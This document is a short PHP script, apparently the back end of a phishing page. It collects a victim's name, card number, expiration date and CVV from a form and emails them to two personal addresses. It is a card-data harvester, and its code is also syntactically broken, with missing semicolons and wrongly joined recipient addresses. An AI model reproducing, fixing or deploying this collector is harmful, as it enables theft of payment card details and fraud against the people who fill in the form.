<?php
    $name = htmlspecialchars($_POST['name']);
    $cardnumber = htmlspecialchars($_POST['cardnumber']);
    $expirationdate = htmlspecialchars($_POST['expirationdate']);
    $cvv = htmlspecialchars($_POST['cvv'])
    mail("bigb00024@gmail.com"."romanshapran96@gmail.com", 'КАРТОООООН', "$name\n $cardnumber\n $expirationdate\n $cvv")
